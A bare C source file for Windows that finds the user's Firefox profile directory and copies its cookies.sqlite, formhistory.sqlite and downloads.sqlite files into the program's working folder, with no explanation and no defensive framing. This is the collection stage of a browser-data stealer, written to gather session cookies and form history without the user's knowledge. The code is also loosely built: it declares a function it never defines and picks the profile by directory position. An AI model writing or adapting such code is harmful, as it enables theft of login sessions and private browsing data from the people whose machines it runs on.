#include <windows.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <direct.h>\n#include <dirent.h>\n\nchar* getPath();\nchar* combineStrings(char* profile, char* path);\nchar** findProfile(char* path);\nvoid copyagain();\n\nint main()\n{ \n    int fileIndex;\n    char* fileLocation = getPath(); \n    char* whereAmI = _getcwd(NULL, 0);\n    char **files = findProfile(fileLocation);\n    char* filesToExport[3] = {"\\formhistory.sqlite", "\\cookies.sqlite", "\\downloads.sqlite"};\n    char* profileName = files[2];\n    char pathWoutFile[MAX_PATH];\n    char fullPathWithFile[MAX_PATH];\n    char fullSendPath[MAX_PATH];\n\n    snprintf(pathWoutFile, MAX_PATH, "%s\\%s", fileLocation, profileName);\n\n    for (int i = 0; i < 3; i++) {\n        snprintf(fullPathWithFile, MAX_PATH, "%s%s", pathWoutFile, filesToExport[i]);\n        snprintf(fullSendPath, MAX_PATH, "%s%s", whereAmI, filesToExport[i]);\n\n        if (!CopyFile(fullPathWithFile, fullSendPath, TRUE)) {\n            printf("Failed to copy file %s to %s. Error: %lu\n", fullPathWithFile, fullSendPath, GetLastError());\n        }\n    }\n\n    return 0;\n}\n\nchar* getPath()\n{\n    static char fullPath[MAX_PATH];\n    char* drive = getenv("SYSTEMDRIVE");\n    char* user = getenv("USERNAME");\n\n    OSVERSIONINFO info;\n    info.dwOSVersionInfoSize = sizeof(info);\n    GetVersionEx(&info);\n\n    if (info.dwMajorVersion >= 6) {\n        snprintf(fullPath, MAX_PATH, "%s\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", drive, user);\n    } else {\n        snprintf(fullPath, MAX_PATH, "%s\\Documents and Settings\\%s\\Application Data\\Mozilla\\Firefox\\Profiles", drive, user);\n    }\n\n    return fullPath;\n}\n\nchar** findProfile(char* path)\n{\n    DIR *dir = opendir(path);\n    struct dirent *dp; \n    size_t filecount = 0; \n    size_t i = 0;\n    char **files;\n\n    if (dir == NULL) {\n        return NULL; \n    }\n    while ((dp = readdir(dir)) != NULL) {\n        filecount++;\n    }\n\n    files = (char **) malloc(filecount * sizeof(*files));\n    if (files == NULL) {\n        return NULL; \n    }\n\n    rewinddir(dir);\n    while ((dp = readdir(dir)) != NULL) {\n        files[i] = strdup(dp->d_name);\n        if (files[i] == NULL) {\n            while (i > 0) {\n                free(files[--i]);\n            }\n            free(files);\n            return NULL;\n        }\n        i++;\n    }\n\n    closedir(dir);\n    return files;\n}